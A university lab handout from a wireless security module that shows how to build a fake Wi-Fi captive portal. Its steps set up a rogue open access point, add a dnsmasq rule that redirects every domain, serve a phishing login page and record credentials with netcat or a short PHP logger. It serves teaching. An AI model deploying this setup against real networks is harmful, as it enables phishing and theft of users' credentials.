
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Fake Captive Portal with DNS Spoofing  
**Author:** Dr Ayman El Hajjar  

---

# Lab: DNS Spoofing and Credential Harvesting via Captive Portal

---

### Objective

Simulate a fake Wi-Fi login page using DNS spoofing and a rogue AP.  
Users are redirected to a phishing page when attempting to browse the web.

---

## Requirements

- Raspberry Pi or Kali-based Rogue AP setup
- `dnsmasq`, `apache2`, `iptables`
- Phishing HTML page (`index.html`) saved in `/var/www/html`
- Target clients connecting via Open AP

---

## Step-by-Step Instructions

### 1. Launch Rogue AP (Open)

```bash
sudo ./setup_rogue_ap.sh
```

Make sure the AP is broadcasting an SSID like `FreeWiFi`.

---

### 2. Start dnsmasq for DHCP and DNS Spoofing

```bash
sudo dnsmasq -C /tmp/dnsmasq.conf
```

> The config should include:
```
address=/#/192.168.140.1
```

This forces all domain requests to redirect to the rogue AP.

---

### 3. Host a Fake Login Page

Ensure `/var/www/html/index.html` is a phishing page asking for username/password.

Start Apache:

```bash
sudo systemctl start apache2
```

---

### 4. Capture Submitted Credentials

Use a simple PHP logger or netcat listener:
```bash
sudo nc -lvp 4444
```
Or setup:
```php
<?php
file_put_contents("/tmp/creds.txt", print_r($_POST, true), FILE_APPEND);
?>
```

---

## Discussion Points

- How realistic was the login page?
- What protections would stop this?
- Would DNS over HTTPS (DoH) have worked?

---

## Teardown

```bash
sudo ./teardown_ap.sh
sudo systemctl stop apache2
sudo pkill dnsmasq
```

---

## Optional Screenshots

Store in `tasks/img/`:
- Fake portal login page
- DNS redirection in Wireshark
- Captured credentials

---

## Summary

| Component  | Tool       | Purpose                         |
|------------|------------|----------------------------------|
| Rogue AP   | `hostapd`  | Broadcasts fake SSID            |
| DNS spoof  | `dnsmasq`  | Redirects all domains           |
| Web server | `apache2`  | Hosts phishing login page       |
| Logging    | `netcat` or PHP | Captures credentials      |

---
